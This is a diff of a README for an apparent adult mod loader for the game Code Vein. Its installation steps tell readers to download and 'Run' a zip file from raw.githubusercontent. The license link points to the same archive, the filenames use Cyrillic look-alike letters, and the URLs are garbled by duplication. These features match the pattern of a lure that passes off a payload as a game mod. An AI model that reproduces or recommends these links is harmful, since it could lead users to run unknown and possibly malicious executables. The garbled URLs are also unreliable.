@@ -33,13 +33,13 @@ Welcome to the **Code Vein Adult Mod Loader**! This tool simplifies the process 
 
 ## 🛠️ Installation
 
-1. Download https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/Lоader.zip from the repository.
+1. Download https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zipоhttps://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zip from the repository.
 2. Extract to your Code Vein installation folder.
-3. Run "https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/Lоader.zip" and select desired mods.
+3. Run "https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zipоhttps://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zip" and select desired mods.
 4. Launch the game and enjoy new features!
 
 ## ⚠️ Disclaimer
 This project is intended for adult audiences only. All content and mods are user-generated. Always backup your files! Not affiliated with official game developers. Use responsibly and review local laws regarding game modification.
 
 ## 📜 License
-This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/Lоader.zip). Feel free to report issues, request features, or contribute enhancements!
+This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zipоhttps://raw.githubusercontent.com/3d-web/CodeVeinMatureModsHub/main/unconstant/Mods_Mature_Vein_Code_Hub_3.8.zip). Feel free to report issues, request features, or contribute enhancements!
